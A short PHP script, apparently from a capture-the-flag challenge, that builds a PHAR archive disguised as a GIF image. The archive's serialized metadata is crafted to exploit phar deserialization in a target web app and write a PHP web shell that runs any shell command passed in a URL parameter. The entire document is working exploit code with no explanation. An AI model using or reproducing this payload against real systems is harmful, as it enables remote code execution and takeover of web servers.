#!/usr/bin/env php

<?php
  class Meme { }
  $m = new Meme();
  $m->title = 'fuxsocy';
  $m->author = 'aesophor';
  $m->content = '<?php passthru($_GET["cmd"]); ?>';
  $m->filename = 'images/aesophor/fuxsocy.php';

  $phar = new Phar("payload.phar");
  $phar->startBuffering();
  $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
  $phar['meow.txt'] = 'owo';
  $phar->setMetadata($m);
  $phar->stopBuffering();
?>

